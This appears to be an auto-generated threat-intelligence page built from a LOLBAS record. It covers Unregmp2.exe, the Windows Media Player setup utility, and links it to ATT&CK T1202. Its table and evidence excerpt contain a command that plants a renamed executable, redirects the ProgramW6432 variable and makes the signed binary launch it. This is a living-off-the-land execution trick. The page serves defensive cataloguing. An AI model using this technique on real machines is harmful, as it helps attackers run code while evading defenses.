---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Unregmp2.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `unregmp2.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Unregmp2.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Microsoft Windows Media Player Setup Utility

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/unregmp2.md)
- Source verification: [source record](../../sources/lolbas/unregmp2.exe.md)

## Aliases

- `Unregmp2.exe`
- `unregmp2.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1202 - Indirect Command Execution](../../attack/techniques/T1202-indirect-command-execution.md) | explicit | source | Command metadata lists T1202: rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V... |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/unregmp2.exe.md)

## Source Verification

[source record](../../sources/lolbas/unregmp2.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@notwhickey'
Person: Wade Hickey
Author: Wade Hickey
Commands:
- Category: Execute
Command: rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe
"%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe
```
